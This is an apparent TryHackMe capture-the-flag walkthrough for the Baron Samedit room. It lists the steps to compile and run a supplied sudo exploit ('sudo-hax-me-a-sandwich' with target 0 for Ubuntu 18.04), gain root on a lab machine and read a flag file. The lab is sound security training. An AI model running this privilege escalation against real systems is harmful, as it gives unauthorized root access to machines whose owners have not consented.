Walkthrough about Baron Samedit

February 7, 2022

------------------------------------------


First we are going to join the room and we will deploy the machine.

Then we are going to read the files containing the juicy information about this room. 

After, reading all of that and checking the other links, we can know use ssh service to log into the tryhackme user

```
ssh tryhackme@10.10.153.198
```

We are going to enumerate into the machine and use commands like 

```
ls 
cd Exploit
ls
```

Then after we saw some files, we remembered that we need to use the command-

```
make
```

So, that we are going to produce some files or scripts and we did see some files after using 'ls' command.

- After compiling the exploit, what is the name of the executable created (blurred in the screenshots above)?
	- `sudo-hax-me-a-sandwich`

Then after that we can use the exploit to get the root user.

```
./sudo-hax-me-a-sandwich
```

NEEDS TO SPECIFY A PARAMETER (As we know by the given information we will input '0' in the parameter since it is ubuntu and has a version of 18.04.05 - Bionic Beaver)

```
./sudo-hax-me-a-sandwich 0
```

Then after that we did get our root user or we did elevate our privilege...

```
cd /root
ls
cat flat.txt
```

Done--